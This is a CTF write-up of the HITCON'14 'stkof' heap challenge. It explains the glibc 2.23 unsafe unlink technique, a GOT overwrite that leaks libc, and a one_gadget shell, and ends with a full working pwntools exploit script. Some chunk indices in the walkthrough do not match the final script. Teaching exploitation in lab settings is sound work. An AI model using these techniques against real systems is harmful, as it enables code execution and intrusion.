+++
title = 'HITCON’14 Stkof'
date = 2026-03-19T15:27:13+10:00
draft = false
description = "A writeup for the stkof challenge in hitcon 14, I will use the unsafe unlink technique to exploit the heap and onegadget to trigger the shell."
+++

## Introduction

We will go through the basics of the unsafe unlink technique and practice on the Hitcon'14 Stkof challenge. This CTF will use the version glibc-2.23.

## The unlink process
The unsafe unlink is a heap exploitation technique that allows us to unlink a heap chunk and achieve an arbitrary write. An arbitrary write will then be used to modify function hooks which are used to call functions. In our post we will target the `malloc` call to trigger the shell then modify the address `strlen` to `puts` for an info leak. 

The pointer table in this CTF starts at 0x602140, all `malloc` calls are stored here. Our CTF by design does not restrict the amount of times we call `malloc`. Hence we can create hundreds of chunks. I decided to start with ten `0x80` sized chunks.

```python
add(0x80)
add(0x80)
add(0x80)
add(0x80)
add(0x80) # Im storing my fake chunk here
add(0x80)
add(0x80)
add(0x80)
add(0x80)
add(0x80)
```


I will be storing a fake chunk in the fifth heap chunk. A fake chunk is a chunk designed to mimic an actual heap chunk. It will confuse malloc and allow me to access areas of the memory that I should not be allowed to.


{{< figure src="/img/chunkDiagram.png" alt="Example" width="300" >}}


Start by creating a fake chunk, to mimic the image displayed above:

```python
fakeChunk += b""
fakeChunk += p64(0x00) # Size of the previous chunk
fakeChunk += p64(0x80) # Size of the current chunk
```

Next up we need to allocate some forward and backward pointers for our fake chunk. In order to successfully set up these pointers we need to satisfy the following checks: 

```C
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
```

This is checking to see if the forwards and backwards pointers still follow a doubly linked list. It's going to check the next chunk after `p` and see if it points back to chunk `P`. To achieve this it will check the value here `(fd->bk)`. Then it checks if the chunk behind is pointing to chunk `p` by using `(bk->fd)`. A snippet of the code is shown below. 


{{< figure src="/img/fdbkCheck.png" alt="Example" width="600" >}}


An alternative way to think about `FD->bk` is `FD + 0x18`. So we need to make use of the fact that `FD+0x18` and `BK+0x10` are equal to `P`. This will make the unlink function work with this fake chunk.

Even though the FD is meant to be a heap chunk, malloc's code does not check that. We can find a writable place in memory where the `memory address + 0x18` and `memory address + 0x10` is equal to `P`.

During the reverse engineering phase of the CTF, there is line `(*(void **)(&ptrTable + (long)valueCount * 8) = mem;)` in the “allocate” function that is responsible for calling malloc and it stores a reference to the heap chunk inside a pointer table. A screenshot of the function is shown below.


{{< figure src="/img/allocateFunction.png" alt="Example" width="400" >}}

By clicking on the “ptrTable” we know that it's stored at the memory address `0x602140`. I created a few chunks to see where exactly the pointers were being stored in this table and printed it out in gdb. 

{{< figure src="/img/ptrTable.png" alt="Example" width="500" >}}


This is where the first six heap chunks are stored. So in order for us to satisfy that condition we will use the following pointers for the `FD (0x602150)` and `BK (0x602158)`. When malloc runs the check `FD->bk`, it will do `0x602150 + 0x18 = 0x602168`. The address `0x602150` holds our `p` value, thus the first half of the check is satisfied. A similar operation is performed for `BK->fd`, but here it checks if `0x602158 + 0x10 = 0x602168`. This check will also hold hence allowing us to unlink the chunk through backward consolidation.

After this we can pad up the fake chunk with twelve `p64(0x00)` bytes. At this stage our fake chunk should look like this.


```python
# Initialize the fake chunk.
fakeChunk = b""

# Size of the previous chunk.
fakeChunk += p64(0x00)

# Size of the current chunk
fakeChunk += p64(0x80)

## forward pointer
fakeChunk += p64(0x602150)

# Backward Pointer
fakeChunk += p64(0x602158)

# Padding
fakeChunk += p64(0x0)* 12
```

There is another check we need to bypass that malloc looks at `(chunksize (p) != prev_size (next_chunk (p)))`. This checks if the chunksize of our current chunk that will be freed is the same size as the previous chunk size field being unlinked. 

```python
# Prev chunk size
fakeChunk += p64(0x80)
# Next chunk size (but i overwrote the prev_in_use to 0)
fakeChunk += p64(0x90)
```

With this in place we can trigger the unlink method on our fake chunk.

```python
# Insert the fake chunk
scan(5, 0x90, fakeChunk)

# Remove chunk 6 and cause backward consolidation with the fake chunk
remove(6)
```

The pointer should be zeroed out at index 6 and we should have an entry in the unsorted bin.

{{< figure src="/img/ptrTable2.png" alt="Example" width="500" >}}


You can also see that our fake chunk has been added to the unsorted bin and the chunk size has changed to `0x111.` This is because we backward consolidated two chunks (fake chunk & chunk on index 6), merging them together into one. 

{{< figure src="/img/fakeChunk.png" alt="Example" width="500" >}}


## Using the GOT Table to leak addresses

Now that we have control over the pointer table, let's change some of the addresses. This time when we say “scan on the 5th index”, it will go to the address we have on the 5th index and start adding our data there. In our case it will start adding the strlen and malloc addresses from `0x602150`.


{{< figure src="/img/ptrTable3.png" alt="Example" width="500" >}}

```python
scan(4, 0x10, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))
scan(1, 0x8, p64(elf.symbols["puts"]))
```

Confirm that we have the addresses of `strlen` and `malloc` written at `0x602150` and `0x602158`.

{{< figure src="/img/ptrTable4.png" alt="Example" width="500" >}}

In order to print this address to the screen, we can overwrite the GOT entry of strlen and replace it with puts. This redirects execution from the strlen address to the puts function.

This line in printData will get replaced with the puts function, allowing us to see the address at a specific index `strlen(*(char **)(&ptrArray + (uVar1 & 0xffffffff) * 8));`.

```python
# Overwrite got entry for strlen with plt address of puts
scan(2, 0x8, p64(elf.symbols["puts"]))
```

Now when we call view(2), the variable mallocLibc should contain the address leak we are looking for.

```python
mallocLibc = view(2)
```

We can get the libc base using the line below, `libc.symbols[“malloc”]` will hold the function offset and we can subtract that from the `mallocLibc` variable to get the base libc address.

```python
libcBase = int(mallocLibc, 16) - libc.symbols["malloc"]
```

In order to pop the shell we can use onegadget, for this CTF I decided to go with `0xf02a4` address since `$rsp+0x50` was zeroed out. 

```bash
$ one_gadget libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

After replacing the `malloc` call with the onegadget, we can trigger the gadget and get a shell.

```python
oneShot = libcBase + 0xf02a4
scan(3, 0x8, p64(oneShot))
target.send("1\n1\n")
```



## Assumptions and Additional Information:

This exploit also relies on the assumptions that you have a pointer table big enough so we can satisfy the `FD->bk` and `bk->FD` checks. For this exploit we need at least six heap chunks to get it working for the CTF. Anything below this would require methods since the unsafe unlink technique will not work with this pointer table. Luckily we have a pointer table that is very big and we can get away with allocating a lot of memory.

The table is of significance since it achieves arbitrary read/write into areas of memory that we should not have access to. In our case we were able to leak libc addresses.



## Full Exploit

```python
from pwn import *

target = process([
   "./ld-2.23.so",
   "./stkof"
], env={"LD_LIBRARY_PATH":"."})
elf = ELF("stkof")
libc = ELF("libc-2.23.so")

gdb.attach(target)

# I/O Functions
def add(size):
 target.sendline("1")
 target.sendline(str(size))
 print (target.recvuntil("OK\n"))


def scan(index, size, data):
 target.sendline("2")
 target.sendline(str(index))
 target.sendline(str(size))
 target.send(data)
 print (target.recvuntil("OK\n"))


def remove(index):
 target.sendline("3")
 target.sendline(str(index))
 print (target.recvuntil("OK\n"))


def view(index):
 target.sendline("4")
 target.sendline(str(index))
 leak = target.recvline()
 leak = leak[::-1]
 print("printing leak:")
 leakHex = '0x' + str(leak.hex())[2:]
 print(target.recvuntil("OK\n"))
 return leakHex


add(0x80)
add(0x80)
add(0x80)
add(0x80)
add(0x80) # Im storing my fake chunk here
add(0x80)
add(0x80)
add(0x80)
add(0x80)
add(0x80)


# Initialize the fake chunk.
fakeChunk = b""
# Size of the previous chunk.
fakeChunk += p64(0x00)
# Size of the current chunk
fakeChunk += p64(0x80)
## forward pointer
fakeChunk += p64(0x602150)
# Backward Pointer
fakeChunk += p64(0x602158)
# Padding
fakeChunk += p64(0x0)* 12
# Prev chunk size
fakeChunk += p64(0x80)
# Next chunk size (but i overwrote the prev_in_use to 0)
fakeChunk += p64(0x90)


# Insert the fake chunk
scan(5, 0x90, fakeChunk)
# Remove chunk 6 and cause backward consildation with chunk 5.
remove(6)
# Write the got addresses of strlen and malloc to 0x602148 (array of ptrs of heap address)
scan(5, 0x10, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))
# Overwrite got entry for strlen with plt address of puts
scan(2, 0x8, p64(elf.symbols["puts"]))

mallocLibc = view(3)

print("mallocLibc: ", mallocLibc)

libcBase = int(mallocLibc, 16) - libc.symbols["malloc"]
oneShot = libcBase + 0xf02a4

print ("libc base: ",  hex(libcBase))
print ("oneshot gadget: " + hex(oneShot))

# Call malloc
scan(3, 0x8, p64(oneShot))
target.send("1\n1\n")

# Enjoy your shell!
target.interactive()
```

## References
https://www.youtube.com/watch?v=FOdkyVcbCk0&list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&index=1

https://www.youtube.com/watch?v=TZWKD4vQFm8&list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&index=2

https://www.youtube.com/watch?v=utKI1zsWVd8&list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&index=3

https://www.youtube.com/watch?v=yMONHr6mp-w&list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&index=4

https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68


